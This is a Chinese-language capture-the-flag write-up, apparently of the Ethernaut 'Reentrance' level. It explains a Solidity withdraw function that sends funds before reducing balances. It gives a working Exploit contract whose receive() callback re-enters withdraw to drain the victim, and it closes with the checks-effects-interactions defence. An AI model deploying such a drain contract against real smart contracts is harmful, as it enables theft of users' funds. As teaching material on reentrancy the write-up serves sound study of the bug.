# 第十关：Reentrance

[toc]
### 本关知识点：
```
对外部方法调用产生的重入攻击。
```

## 1. 题目要求
` 偷走合约的所有资产`

## 2. 代码功能解读
![[Pasted image 20230516153630.png]]


## 3. 漏洞分析
```
重入攻击
	在withdraw方法中，合约先将钱发送给对方，然后再扣除余额，我们通过发钱的时候触发回调函数来再次进入合约，完成多次提取相同的余额。
```

## 4. 攻击方法
1. 攻击合约调用withdraw发送取出所有的钱，
2. 在合约的receivefallback方法中再次进入withdraw，请求的amount为0.01，这样我们可以让合约产生下溢。
3. 最后查看合约有多少钱，直接withdraw全部调走。
``` java


contract Exploit {

  Reentrance victim;

  

  constructor (address victim_) payable {

    victim = Reentrance(payable(victim_));

  }

  

  function attack() public payable {

    victim.donate{value: 0.001 ether}(address(this));

    victim.withdraw(0.001 ether);

  }

  

  receive() external payable{

    if(address(victim).balance != 0 ){

      victim.withdraw(0.001 ether);

    }

  }

  function kill(address to) public {

    selfdestruct(payable(to));

  }

}
```

## 5. 攻击调用图

部署的时候记得往合约发送大于0.001ether的金额
攻击成功，我们在受害者合约中的balances很大，且受害者合约余额为0
![[Pasted image 20230516155701.png]]
![[Pasted image 20230516160111.png]]

## 6. 知识点分析
重入攻击是最普遍的攻击之一，我们在编写合约的时候，要遵守`检查-生效-交互`的模式，防止合约被黑客利用。